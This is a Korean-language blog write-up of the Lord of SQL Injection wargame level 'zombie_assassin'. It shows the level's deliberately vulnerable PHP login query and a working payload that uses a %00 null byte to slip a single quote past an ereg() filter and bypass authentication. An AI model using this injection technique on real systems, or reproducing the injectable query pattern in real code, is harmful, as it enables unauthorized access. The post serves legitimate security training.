---
title: "[Lord of SQL Injection] LoS - zombie_assassin 문제풀이"
date: 2018-08-04
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

지난 문제에 이어 또 다른 `assassin` 문제이다.
이번에는 `zombie_assassin`이란다.
이 전 문제의 `assassin`이 죽지도 않고 다시 살아서 돌아왔나보다.  

<!--more-->

코드는 다음과 같다.  

```php
----------------------------------------------------------------------------------------
query : select id from prob_zombie_assassin where id='' and pw=''
----------------------------------------------------------------------------------------

<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/\\\|prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/\\\|prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(@ereg("'",$_GET[id])) exit("HeHe"); 
  if(@ereg("'",$_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_zombie_assassin where id='{$_GET[id]}' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) solve("zombie_assassin"); 
  highlight_file(__FILE__); 
?>
```

이번에도 `'(싱글쿼터)`에만 필터링이 있다.
그런데 이번에는 `like`이 아니라 다시 `=`이 사용되었고, `preg_match()`가 아니라 `ereg()`가 사용되었다.
`ereg()`는 이 전에도 한번 언급한 적 있었던 것 같은데, 필터링이 완벽하지 않다.
대소문자 구분도 못할뿐더라, `%00`으로 `null byte`를 넣어주면 이를 문자열의 끝으로 인식 해 이 뒤의 문자는 검사하지 않는다.
때문에 나도 `%00`을 사용 해 문제를 풀었다.
아래와 같이 입력 해 주면 문제를 풀 수 있다.  

```plain
?id=admin&pw=%00a' or id='admin
```

---

```php
-------------------------------------------------------------------------------------------------------------------
query : select id from prob_zombie_assassin where id='admin' and pw='a' or id='admin'
-------------------------------------------------------------------------------------------------------------------

ZOMBIE_ASSASSIN Clear!
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/\\\|prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/\\\|prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(@ereg("'",$_GET[id])) exit("HeHe"); 
  if(@ereg("'",$_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_zombie_assassin where id='{$_GET[id]}' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) solve("zombie_assassin"); 
  highlight_file(__FILE__); 
?>
```

---

```
ZOMBIE_ASSASSIN Clear!!
```